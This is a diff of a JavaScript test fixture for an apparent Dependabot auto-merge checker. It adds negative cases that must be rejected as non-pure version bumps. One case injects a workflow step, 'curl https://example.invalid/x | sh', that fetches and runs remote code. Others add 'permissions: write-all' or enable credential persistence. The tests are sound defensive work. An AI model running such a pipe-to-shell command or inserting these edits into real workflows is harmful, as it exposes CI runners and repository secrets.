@@ -13,11 +13,11 @@ export function fixture(input = {}) {
     state: 'open',
     user: { id: 49699333, login: input.author ?? 'dependabot[bot]', type: 'Bot' },
     head: { ref: input.branch ?? 'dependabot/github_actions/actions/checkout-7', sha: selected },
-    base: { repo: { full_name: 'axatbhardwaj/axstack' }, sha: base },
+    base: { repo: { full_name: input.baseRepo ?? 'axatbhardwaj/axstack' }, sha: base },
     title: input.title ?? 'Bump actions/checkout from 6 to 7.0.0',
     body: input.body ?? null,
-    changed_files: 1,
-    commits: 1,
+    changed_files: input.changedFiles ?? 1,
+    commits: input.priorCommitAuthor ? 2 : 1,
   };
   const path = input.filename ?? file;
   let reads = 0;
@@ -25,15 +25,10 @@ export function fixture(input = {}) {
     {
       filename: path,
       sha: blob,
-      status: input.oldFilename ? 'renamed' : 'modified',
+      status: input.fileStatus ?? (input.oldFilename ? 'renamed' : 'modified'),
       ...(input.oldFilename ? { previous_filename: input.oldFilename } : {}),
     },
   ];
-  const workflow = (ref) => `jobs:
-  lint:
-    steps:
-      - uses: actions/checkout@${ref}
-`;
   const checks = input.checks ?? [
     {
       id: 1,
@@ -62,16 +57,36 @@ export function fixture(input = {}) {
       case repo + '/pulls/1/files':
         return ok(files);
       case repo + '/pulls/1/commits':
-        return ok([{ sha: selected, commit: { message: input.commit ?? 'Update action' } }]);
+        return ok([
+          ...(input.priorCommitAuthor
+            ? [
+                {
+                  sha: '9'.repeat(40),
+                  author: { login: input.priorCommitAuthor },
+                  commit: { message: 'Earlier commit' },
+                },
+              ]
+            : []),
+          {
+            sha: selected,
+            author: input.commitAuthor === null ? null : { login: input.commitAuthor ?? 'dependabot[bot]' },
+            commit: { message: input.commit ?? 'Update action' },
+          },
+        ]);
       case repo + '/compare/' + base + '...' + selected:
         return ok({ merge_base_commit: { sha: mergeBase } });
-      case repo + '/contents/' + path:
+      case repo + '/contents/' + path: {
+        const baseSide = parameters.get('ref') === mergeBase;
+        const content = baseSide
+          ? (input.baseWorkflow ?? workflow('v6'))
+          : (input.headWorkflow ?? workflow(input.pin ?? release));
         return ok({
           type: 'file',
           encoding: 'base64',
           sha: blob,
-          content: btoa(workflow(parameters.get('ref') === mergeBase ? 'v6' : (input.pin ?? release))),
+          content: btoa(content),
         });
+      }
       case repo + '/commits/' + selected + '/check-runs':
         return ok({ check_runs: checks, total_count: input.checkTotal ?? checks.length });
       case repo + '/commits/' + selected + '/statuses':
@@ -93,3 +108,56 @@ export function fixture(input = {}) {
     }
   };
 }
+
+const workflow = (ref) => `jobs:
+  lint:
+    steps:
+      - uses: actions/checkout@${ref}
+`;
+const script = '      - run: curl https://example.invalid/x | sh\n';
+
+export const nonBumps = [
+  { name: 'zero changed refs', forge: { headWorkflow: workflow('v6') }, term: 'versionBump' },
+  { name: 'run-only edit', forge: { headWorkflow: workflow('v6') + script }, term: 'versionBump' },
+  { name: 'pin plus run edit', forge: { headWorkflow: workflow(release) + script }, term: 'versionBump' },
+  {
+    name: 'pin plus with edit',
+    forge: {
+      baseWorkflow: workflow('v6') + '        with: {persist-credentials: false}\n',
+      headWorkflow: workflow(release) + '        with: {persist-credentials: true}\n',
+    },
+    term: 'versionBump',
+  },
+  {
+    name: 'pin plus env edit',
+    forge: { headWorkflow: 'env: {MODE: changed}\n' + workflow(release) },
+    term: 'versionBump',
+  },
+  {
+    name: 'pin plus permissions edit',
+    forge: { headWorkflow: 'permissions: write-all\n' + workflow(release) },
+    term: 'versionBump',
+  },
+  {
+    name: 'pin plus comment-only edit',
+    forge: { headWorkflow: '# changed comment\n' + workflow(release) },
+    term: 'versionBump',
+  },
+  {
+    name: 'pin plus uses-like scalar edit',
+    forge: {
+      baseWorkflow: workflow('v6') + '      - run: |\n          uses: actions/checkout@v6\n',
+      headWorkflow: workflow(release) + '      - run: |\n          uses: actions/checkout@' + release + '\n',
+    },
+    term: 'versionBump',
+  },
+  {
+    name: 'action substitution',
+    forge: { baseWorkflow: workflow('v6').replace('actions/checkout', 'actions/cache') },
+    term: 'versionBump',
+  },
+  { name: 'removed workflow file', forge: { fileStatus: 'removed' }, term: 'versionBump' },
+  { name: 'added workflow file', forge: { fileStatus: 'added' }, term: 'versionBump' },
+  { name: 'non-bot head commit', forge: { commitAuthor: 'octocat' }, term: 'commitAuthors' },
+  { name: 'earlier non-bot commit', forge: { priorCommitAuthor: 'octocat' }, term: 'commitAuthors' },
+];
